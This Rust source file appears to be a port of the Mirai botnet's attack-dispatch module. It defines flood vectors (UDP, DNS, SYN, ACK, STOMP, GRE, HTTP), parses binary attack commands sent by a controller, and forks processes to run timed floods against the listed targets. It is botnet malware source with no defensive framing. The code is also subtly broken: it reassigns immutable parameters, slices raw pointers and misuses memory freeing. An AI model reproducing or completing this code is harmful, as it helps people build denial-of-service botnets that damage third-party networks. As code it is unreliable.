use std::net::{Ipv4Addr, SocketAddrV4};
use std::ptr;
use std::ffi::CString;
use libc::{sockaddr_in, AF_INET};
use std::os::raw::c_void;

const ATTACK_CONCURRENT_MAX: usize = 8;

#[cfg(debug_assertions)]
const HTTP_CONNECTION_MAX: usize = 1000;
#[cfg(not(debug_assertions))]
const HTTP_CONNECTION_MAX: usize = 256;

#[repr(C)]
struct AttackTarget {
    sock_addr: sockaddr_in,
    addr: Ipv4Addr,
    netmask: u8,
}

#[repr(C)]
struct AttackOption {
    val: CString,
    key: u8,
}

type AttackFunc = unsafe fn(u8, *mut AttackTarget, u8, *const AttackOption);
type AttackVector = u8;

const ATK_VEC_UDP: AttackVector = 0;
const ATK_VEC_VSE: AttackVector = 1;
const ATK_VEC_DNS: AttackVector = 2;
const ATK_VEC_SYN: AttackVector = 3;
const ATK_VEC_ACK: AttackVector = 4;
const ATK_VEC_STOMP: AttackVector = 5;
const ATK_VEC_GREIP: AttackVector = 6;
const ATK_VEC_GREETH: AttackVector = 7;
const ATK_VEC_UDP_PLAIN: AttackVector = 9;
const ATK_VEC_HTTP: AttackVector = 10;

const ATK_OPT_PAYLOAD_SIZE: u8 = 0;
const ATK_OPT_PAYLOAD_RAND: u8 = 1;
const ATK_OPT_IP_TOS: u8 = 2;
const ATK_OPT_IP_IDENT: u8 = 3;
const ATK_OPT_IP_TTL: u8 = 4;
const ATK_OPT_IP_DF: u8 = 5;
const ATK_OPT_SPORT: u8 = 6;
const ATK_OPT_DPORT: u8 = 7;
const ATK_OPT_DOMAIN: u8 = 8;
const ATK_OPT_DNS_HDR_ID: u8 = 9;
const ATK_OPT_URG: u8 = 11;
const ATK_OPT_ACK: u8 = 12;
const ATK_OPT_PSH: u8 = 13;
const ATK_OPT_RST: u8 = 14;
const ATK_OPT_SYN: u8 = 15;
const ATK_OPT_FIN: u8 = 16;
const ATK_OPT_SEQRND: u8 = 17;
const ATK_OPT_ACKRND: u8 = 18;
const ATK_OPT_GRE_CONSTIP: u8 = 19;
const ATK_OPT_METHOD: u8 = 20;
const ATK_OPT_POST_DATA: u8 = 21;
const ATK_OPT_PATH: u8 = 22;
const ATK_OPT_HTTPS: u8 = 23;
const ATK_OPT_CONNS: u8 = 24;
const ATK_OPT_SOURCE: u8 = 25;

#[repr(C)]
struct AttackMethod {
    func: AttackFunc,
    vector: AttackVector,
}

#[repr(C)]
struct AttackStompData {
    addr: Ipv4Addr,
    seq: u32,
    ack_seq: u32,
    sport: u16,
    dport: u16,
}

static mut METHODS: Vec<*mut AttackMethod> = Vec::new();
static mut ATTACK_ONGOING: [i32; ATTACK_CONCURRENT_MAX] = [0; ATTACK_CONCURRENT_MAX];

extern "C" {
    fn util_atoi(s: *const i8, radix: i32) -> i32;
    fn inet_addr(cp: *const i8) -> u32;
}

fn attack_init() -> bool {
    unsafe {
        add_attack(ATK_VEC_UDP, attack_udp_generic);
        add_attack(ATK_VEC_VSE, attack_udp_vse);
        add_attack(ATK_VEC_DNS, attack_udp_dns);
        add_attack(ATK_VEC_UDP_PLAIN, attack_udp_plain);
        add_attack(ATK_VEC_SYN, attack_tcp_syn);
        add_attack(ATK_VEC_ACK, attack_tcp_ack);
        add_attack(ATK_VEC_STOMP, attack_tcp_stomp);
        add_attack(ATK_VEC_GREIP, attack_gre_ip);
        add_attack(ATK_VEC_GREETH, attack_gre_eth);
        add_attack(ATK_VEC_HTTP, attack_app_http);
    }
    true
}

unsafe fn attack_kill_all() {
    for i in 0..ATTACK_CONCURRENT_MAX {
        if ATTACK_ONGOING[i] != 0 {
            libc::kill(ATTACK_ONGOING[i], libc::SIGKILL);
        }
        ATTACK_ONGOING[i] = 0;
    }
}

unsafe fn attack_parse(buf: *mut u8, len: usize) {
    let mut duration: u32;
    let mut vector: AttackVector;
    let mut targs_len: u8;
    let mut opts_len: u8;
    let mut targs: *mut AttackTarget = ptr::null_mut();
    let mut opts: *mut AttackOption = ptr::null_mut();

    if len < std::mem::size_of::<u32>() {
        return;
    }
    duration = u32::from_be_bytes(ptr::read(buf as *const [u8; 4]));
    buf = buf.add(std::mem::size_of::<u32>());
    len -= std::mem::size_of::<u32>();

    if len == 0 {
        return;
    }
    vector = *buf;
    buf = buf.add(1);
    len -= 1;

    if len == 0 {
        return;
    }
    targs_len = *buf;
    buf = buf.add(1);
    len -= 1;

    if targs_len == 0 {
        return;
    }

    if len < (std::mem::size_of::<u32>() + std::mem::size_of::<u8>()) * targs_len as usize {
        return;
    }
    targs = libc::calloc(targs_len as usize, std::mem::size_of::<AttackTarget>()) as *mut AttackTarget;
    for i in 0..targs_len {
        (*targs.add(i as usize)).addr = Ipv4Addr::from(u32::from_be_bytes(ptr::read(buf as *const [u8; 4])));
        buf = buf.add(std::mem::size_of::<u32>());
        len -= std::mem::size_of::<u32>();
        (*targs.add(i as usize)).netmask = *buf;
        buf = buf.add(1);
        len -= 1;

        (*targs.add(i as usize)).sock_addr.sin_family = AF_INET as u16;
        (*targs.add(i as usize)).sock_addr.sin_addr.s_addr = (*targs.add(i as usize)).addr.into();
    }

    if len < std::mem::size_of::<u8>() {
        return;
    }
    opts_len = *buf;
    buf = buf.add(1);
    len -= 1;

    if opts_len > 0 {
        opts = libc::calloc(opts_len as usize, std::mem::size_of::<AttackOption>()) as *mut AttackOption;
        for i in 0..opts_len {
            let mut val_len: u8;

            if len < std::mem::size_of::<u8>() {
                return;
            }
            (*opts.add(i as usize)).key = *buf;
            buf = buf.add(1);
            len -= 1;

            if len < std::mem::size_of::<u8>() {
                return;
            }
            val_len = *buf;
            buf = buf.add(1);
            len -= 1;

            if len < val_len as usize {
                return;
            }
            (*opts.add(i as usize)).val = CString::new(&buf[..val_len as usize]).unwrap();
            buf = buf.add(val_len as usize);
            len -= val_len as usize;
        }
    }

    attack_start(duration as i32, vector, targs_len, targs, opts_len, opts);
}

unsafe fn attack_start(duration: i32, vector: AttackVector, targs_len: u8, targs: *mut AttackTarget, opts_len: u8, opts: *mut AttackOption) {
    let pid1 = libc::fork();
    if pid1 == -1 || pid1 > 0 {
        return;
    }

    let pid2 = libc::fork();
    if pid2 == -1 {
        libc::exit(0);
    } else if pid2 == 0 {
        libc::sleep(duration as u32);
        libc::kill(libc::getppid(), libc::SIGKILL);
        libc::exit(0);
    } else {
        for i in 0..METHODS.len() {
            if (*METHODS[i]).vector == vector {
                (*METHODS[i]).func(targs_len, targs, opts_len, opts);
                break;
            }
        }

        libc::exit(0);
    }
}

fn attack_get_opt_str(opts_len: u8, opts: *const AttackOption, opt: u8, def: &str) -> &str {
    for i in 0..opts_len {
        unsafe {
            if (*opts.add(i as usize)).key == opt {
                return (*opts.add(i as usize)).val.to_str().unwrap();
            }
        }
    }

    def
}

fn attack_get_opt_int(opts_len: u8, opts: *const AttackOption, opt: u8, def: i32) -> i32 {
    let val = attack_get_opt_str(opts_len, opts, opt, "");

    if val.is_empty() {
        def
    } else {
        val.parse().unwrap_or(def)
    }
}

fn attack_get_opt_ip(opts_len: u8, opts: *const AttackOption, opt: u8, def: u32) -> u32 {
    let val = attack_get_opt_str(opts_len, opts, opt, "");

    if val.is_empty() {
        def
    } else {
        unsafe { inet_addr(val.as_ptr() as *const i8) }
    }
}

unsafe fn add_attack(vector: AttackVector, func: AttackFunc) {
    let method = libc::calloc(1, std::mem::size_of::<AttackMethod>()) as *mut AttackMethod;

    (*method).vector = vector;
    (*method).func = func;

    METHODS.push(method);
}

unsafe fn free_opts(opts: *mut AttackOption, len: usize) {
    if opts.is_null() {
        return;
    }

    for i in 0..len {
        if !(*opts.add(i)).val.as_ptr().is_null() {
            libc::free((*opts.add(i)).val.as_ptr() as *mut c_void);
        }
    }
    libc::free(opts as *mut c_void);
}
